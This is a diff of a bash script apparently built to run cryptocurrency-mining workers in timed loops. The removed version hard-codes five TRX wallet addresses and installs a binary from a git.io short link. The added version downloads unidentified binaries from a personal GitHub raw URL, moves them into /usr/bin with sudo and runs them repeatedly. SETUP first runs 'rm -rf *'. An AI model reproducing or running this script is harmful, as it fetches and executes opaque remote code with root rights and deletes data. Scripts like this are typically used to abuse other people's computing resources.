@@ -1,70 +1,40 @@
 LOOP=
-SHUF="shuf -n 1 -i 1000-9999"
-COLOR='\033[0;34m'
-THREAD="6"
-WALLET_A="TRX:TNVKNheBts2QGcvXX8bY3BVJzRqgtC5dys"
-WALLET_B="TRX:TLLS6AfUXt8Qnut3Pbz97m3Bjt2tGUEY7A"
-WALLET_C="TRX:THHvwpo8tp9j7XWvC5ki7gfPP41pHUe2QW"
-WALLET_D="TRX:TDfAvZM1PEMwqANRevrGDhnumHQJhS8RyX"
-WALLET_E="TRX:TAEkVhq6SibNipKeNxr28fabX4dTWLGgTk"
-BUILD="$(pwd)/build_config"
+
 MINE_A() {
     LOOP=$(($LOOP + 1))
-    USER="$(echo ${LOOP}th-$($SHUF))"
-    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
-    sed -i "s/USER/$USER/" "build_config"
-    sed -i "s/WALLET/$WALLET_A/" "build_config"
-    chmod +x cc1
-    timeout 45 cc1 --config $BUILD
-    cp -rf backup build_config
+    chmod +x 1
+    timeout 45 1
     clear
 }
 MINE_B() {
     LOOP=$(($LOOP + 1))
-    USER="$(echo ${LOOP}th-$($SHUF))"
-    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
-    sed -i "s/USER/$USER/" "build_config"
-    sed -i "s/WALLET/$WALLET_B/" "build_config"
-    timeout 45 cc1 --config $BUILD
-    cp -rf backup build_config
+    chmod +x 1
+    timeout 45 1
     clear
 }
 MINE_C() {
     LOOP=$(($LOOP + 1))
-    USER="$(echo ${LOOP}th-$($SHUF))"
-    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
-    sed -i "s/USER/$USER/" "build_config"
-    sed -i "s/WALLET/$WALLET_C/" "build_config"
-    timeout 45 cc1 --config $BUILD
-    cp -rf backup build_config
+    chmod +x 1
+    timeout 45 1
     clear
 }
 MINE_D() {
-    LOOP=$(($LOOP + 1))
-    USER="$(echo ${LOOP}th-$($SHUF))"
-    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
-    sed -i "s/USER/$USER/" "build_config"
-    sed -i "s/WALLET/$WALLET_D/" "build_config"
-    timeout 45 cc1 --config $BUILD
-    cp -rf backup build_config
+   LOOP=$(($LOOP + 1))
+    chmod +x 1
+    timeout 45 1
     clear
 }
 MINE_E() {
-    LOOP=$(($LOOP + 1))
-    USER="$(echo ${LOOP}th-$($SHUF))"
-    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
-    sed -i "s/USER/$USER/" "build_config"
-    sed -i "s/WALLET/$WALLET_E/" "build_config"
-    timeout 45 cc1 --config $BUILD
-    cp -rf backup build_config
+   LOOP=$(($LOOP + 1))
+    chmod +x 1
+    timeout 45 1
     clear
 }
 SETUP() {
 rm -rf *
-wget https://git.io/J0jvk  --content-disposition >/dev/null 2>&1
-unzip -q trial 6.zip
-chmod u+x cc1
-sudo mv cc1 /usr/bin
+wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/pake --content-disposition >/dev/null 2>&1
+chmod u+x 1
+sudo mv 1 /usr/bin
 }
 SETUP
 sed -i "s/THREAD/$THREAD/" "build_config"
@@ -76,3 +46,4 @@ do
   MINE_C
   MINE_D
 done
+
